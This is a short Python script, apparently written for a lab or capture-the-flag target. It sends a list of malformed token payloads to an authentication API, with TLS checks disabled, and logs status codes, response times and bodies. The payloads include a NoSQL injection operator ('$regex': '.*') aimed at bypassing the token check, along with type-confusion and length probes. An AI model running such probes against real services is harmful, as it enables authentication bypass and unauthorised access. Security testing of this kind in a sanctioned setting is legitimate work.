import requests
import string
import time
import json
import urllib3

urllib3.disable_warnings()

BASE_URL = "https://bbfbc1bf-5042-411e-86b4-29657887ee45.222.255.138.122.nip.io"
s = requests.Session()
s.verify = False

def send_req(payload, delay=1.5):
    time.sleep(delay)
    while True:
        try:
            t0 = time.perf_counter()
            r = s.post(f"{BASE_URL}/api/authenticate", json=payload, timeout=15)
            dt = (time.perf_counter() - t0) * 1000
            if r.status_code == 502:
                print(f"  [502 Bad Gateway] backing off...")
                time.sleep(3.0)
                continue
            return r.status_code, dt, dict(r.headers), r.text
        except Exception as e:
            print(f"  [Exception {e}] backing off...")
            time.sleep(3.0)

test_cases = [
    ("empty_dict", {}),
    ("empty_token", {"token": ""}),
    ("short_token", {"token": "1234"}),
    ("long_token", {"token": "a" * 49}),
    ("boolean_token", {"token": True}),
    ("int_token", {"token": 123456789}),
    ("list_token", {"token": ["a"] * 48}),
    ("dict_token", {"token": {"$regex": ".*"}}),
    ("null_token", {"token": None}),
    ("special_chars_48", {"token": "!@#$%^&*()_+=-{}[]:;\"'<>?,./~`1234567890abcdef"[:48]}),
    ("zeros_48", {"token": "0" * 48}),
    ("ones_48", {"token": "1" * 48}),
    ("a_48", {"token": "a" * 48}),
    ("A_48", {"token": "A" * 48}),
]

for name, payload in test_cases:
    code, dt, headers, body = send_req(payload)
    print(f"[{name}] Code: {code}, Time: {dt:.2f}ms")
    print(f"  Headers: {headers.get('content-type')}, {headers.get('server')}")
    print(f"  Body: {body}\n")
